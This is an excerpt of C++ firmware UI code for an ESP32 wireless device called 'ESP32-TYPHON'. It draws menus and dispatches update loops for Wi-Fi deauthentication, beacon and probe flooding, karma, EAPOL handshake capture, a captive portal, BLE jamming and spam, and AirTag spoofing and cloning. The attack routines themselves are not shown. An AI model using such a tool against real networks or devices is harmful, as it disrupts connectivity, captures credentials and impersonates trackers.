  Theme::drawStatusBar("AirTag Tools");
  char buf[28];
  if (airDetRunning) {
    Theme::printCentered("DETECTING", 28, COL_ACCENT, 1);
    snprintf(buf, sizeof(buf), "Found %d", airTagCount);
    Theme::printCentered(buf, 48, COL_FG, 1);
    if (airTagCount > 0) {
      snprintf(buf, sizeof(buf), "%.12s %ddBm", airTags[0].name, (int)airTags[0].rssi);
      Theme::printCentered(buf, 64, COL_DIM, 1);
    } else {
      Theme::printCentered("Scanning BLE...", 64, COL_DIM, 1);
    }
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (airSpoofRunning) {
    Theme::printCentered("SPOOFING", 28, COL_ERR, 1);
    if (airSpoofTarget < 0) Theme::printCentered("Spam all", 44, COL_FG, 1);
    else Theme::printCentered("Clone one", 44, COL_FG, 1);
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)airTagSent);
    Theme::printCentered(buf, 60, COL_DIM, 1);
    snprintf(buf, sizeof(buf), "%d captured", airTagCount);
    Theme::printCentered(buf, 74, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    // Menu: Detect / Spam all / Clone first
    const char* items[] = { "Detect AirTags", "Spam all / synth", "Clone first hit" };
    for (int i = 0; i < 3; i++) {
      char line[28];
      snprintf(line, sizeof(line), "%s %s", (i == uiSelAir()) ? ">" : " ", items[i]);
      Theme::printCentered(line, 32 + i * 14, (i == uiSelAir()) ? COL_ACCENT : COL_FG, 1);
    }
    snprintf(buf, sizeof(buf), "Saved: %d", airTagCount);
    Theme::printCentered(buf, 80, COL_DIM, 1);
    Theme::drawFooter("Up/Dn", "Sel / L-Back");
  }
}



void UI::drawCurrent() {
  Theme::clear();
  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress() : -1;
  switch (_screen) {
    case SCR_MAIN:
      Theme::drawStatusBar("ESP32-TYPHON", hp);
      Theme::drawMenuList(MAIN_ITEMS, MAIN_COUNT, _sel, _top);
      Theme::drawFooter("Joy: Nav", "Hold=Back");
      break;
    case SCR_WIFI_MENU:
      Theme::drawStatusBar("Wi-Fi Tools", hp);
      Theme::drawMenuList(WIFI_ITEMS, WIFI_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Hold=Back");
      break;
    case SCR_BLE_MENU:
      Theme::drawStatusBar("Bluetooth", hp);
      Theme::drawMenuList(BLE_ITEMS, BLE_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Hold=Back");
      break;
    case SCR_WIFI_SCAN:   drawWifiScanScreen(); break;
    case SCR_BLE_SCAN:    drawBleScanScreen(); break;
    case SCR_PACKET_MON:  drawPacketMonitor(); break;
    case SCR_BEACON:      drawBeaconScreen(); break;
    case SCR_DEAUTH_DET:  drawDeauthDetScreen(); break;
    case SCR_DEAUTH:      drawDeauthScreen(_sel, _top); break;
    case SCR_CLIENT_SNIFF: drawClientSniffScreen(_sel, _top); break;
    case SCR_PROBE:       drawProbeScreen(_sel, _top); break;
    case SCR_CAPTIVE:     drawCaptiveScreen(); break;
    case SCR_BLE_SNIFF:   drawBleSniffScreen(_sel, _top); break;
    case SCR_BLE_SPOOF:   drawBleSpoofScreen(_sel, _top); break;
    case SCR_KARMA:      drawKarmaScreen(); break;
    case SCR_FLOOD:      drawFloodScreen(_sel, _top); break;
    case SCR_EAPOL:      drawEapolScreen(); break;
    case SCR_WAR:        drawWarScreen(); break;
    case SCR_SOUR_APPLE:  drawSourAppleList(_sel, _top); break;
    case SCR_BLE_JAM:     drawJamScreen(); break;
    case SCR_AIRTAG:      drawAirTagScreen(); break;
    case SCR_ABOUT:
      Theme::drawStatusBar("About", hp);
      Theme::printCentered("ESP32-TYPHON", 36, COL_TITLE, 1);
      Theme::printCentered("ST7735 160x128", 52, COL_FG, 1);
      Theme::printCentered("WiFi + BLE", 68, COL_DIM, 1);
      Theme::printCentered("Joystick UI", 84, COL_DIM, 1);
      Theme::drawFooter(nullptr, "Btn = Back");
      break;
    default:
      drawStubScreen("Unknown", "Go back");
      break;
  }
  _dirty = false;
}

void UI::loop() {
  // ---- BOOT button (GPIO0) hold 2s toggles Soft-AP web mode ----
  bool bootDown = (digitalRead(BOOT_BTN) == LOW);
  if (bootDown) {
    if (!bootWasDown) {
      bootWasDown = true;
      bootHoldStart = millis();
    } else if (bootHoldStart && (millis() - bootHoldStart >= 2000)) {
      bootHoldStart = 0;  // fire once per hold
      if (webMode) {
        exitWebMode();
        _screen = SCR_MAIN;
        _sel = 0; _top = 0; _dirty = true;
        drawCurrent();
      } else {
        enterWebMode();
      }
    }
  } else {
    bootWasDown = false;
    bootHoldStart = 0;
  }

  if (webMode) {
    wifiScanUpdate();
    bleScanUpdate();
    pmUpdate();
    detUpdate();
    clientSniffUpdate();
    sniffUpdate();
    // Attack TX runs on dual-core workers when armed
    if (!dualCoreArmed) {
      beaconUpdate(); deauthUpdate(); probeUpdate();
      karmaUpdate(); floodUpdate(); eapolUpdate();
      spoofUpdate(); sourUpdate(); jamUpdate(); airTagUpdate();
    } else {
      // light touch: keep scan-side BLE/air detect on main if needed
      airDetUpdate();
    }
    handleWebClients();
    // If exit was requested from web UI
    if (!webMode) {
      _screen = SCR_MAIN;
      _sel = 0; _top = 0; _dirty = true;
      drawCurrent();
    }
    return;  // skip joystick UI while web mode is active
  }

  joystick.update();
  wifiScanUpdate();
  bleScanUpdate();
  pmUpdate();
  detUpdate();
  clientSniffUpdate();
  captiveUpdate();
  sniffUpdate();
  if (!dualCoreArmed) {
    beaconUpdate(); deauthUpdate(); probeUpdate();
    karmaUpdate(); floodUpdate(); eapolUpdate();
    spoofUpdate(); sourUpdate(); jamUpdate(); airTagUpdate();
  } else {
    airDetUpdate();
  }

  static bool wasWifi = false, wasBle = false;
  if (wasWifi && !wifiScanning && _screen == SCR_WIFI_SCAN) _dirty = true;
  if (wasBle  && !bleScanning  && _screen == SCR_BLE_SCAN)  _dirty = true;
  wasWifi = wifiScanning;
  wasBle  = bleScanning;

  static uint32_t lastLive = 0;
  if ((_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
       _screen == SCR_DEAUTH_DET || _screen == SCR_DEAUTH || _screen == SCR_CLIENT_SNIFF ||
       _screen == SCR_PROBE || _screen == SCR_KARMA || _screen == SCR_FLOOD ||
       _screen == SCR_EAPOL || _screen == SCR_WAR || _screen == SCR_CAPTIVE ||
       _screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF ||
       _screen == SCR_SOUR_APPLE || _screen == SCR_BLE_JAM ||
       _screen == SCR_AIRTAG) &&
      (millis() - lastLive > 250)) {
    lastLive = millis();
    _dirty = true;
  }

  // Hold progress counter — refresh header while button down
  static uint8_t lastHoldPct = 255;
  uint8_t hp = joystick.isButtonDown() ? joystick.holdProgress() : 0;
  if (joystick.isButtonDown()) {
    if (_screen == SCR_WIFI_SCAN) hp = joystick.holdProgress2();
    if (hp != lastHoldPct) { lastHoldPct = hp; _dirty = true; }
  } else {
    if (lastHoldPct != 255) { lastHoldPct = 255; _dirty = true; }
  }

  JoyAction a = joystick.getAction();
  if (a != JOY_NONE) handleInput(a);
  if (_dirty) drawCurrent();
}
